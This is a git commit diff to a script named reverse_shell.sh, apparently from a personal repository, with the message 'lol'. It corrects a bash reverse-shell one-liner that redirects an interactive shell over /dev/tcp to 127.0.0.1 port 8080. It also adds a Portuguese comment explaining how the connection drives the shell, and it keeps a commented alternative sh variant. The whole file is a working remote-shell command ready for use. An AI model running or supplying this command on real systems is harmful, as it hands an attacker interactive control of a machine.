ffe5b96dadc96e9dfb64ce7a8d98b93c2a995f90
ferreirasc <leoferreirafx@gmail.com>
2016-10-12 18:33:24 -0300

    lol

--- reverse_shell.sh
+++ reverse_shell.sh
@@ -1,5 +1,7 @@
 #!/bin/bash
 
-bash -i </dev/tcp/127.0.0.1/8080 1<&0 2<&0
+bash -i </dev/tcp/127.0.0.1/8080 1>&0 2>&0
+# stdin vindo da conexão interpretado pela bash com stdout e stderr retornado de volta pra conexão (socket tcp)
+
 # ou.... sh -i 1>&/dev/tcp/127.0.0.1/8080 0<&1
 # só funciona em alguns sistemas...
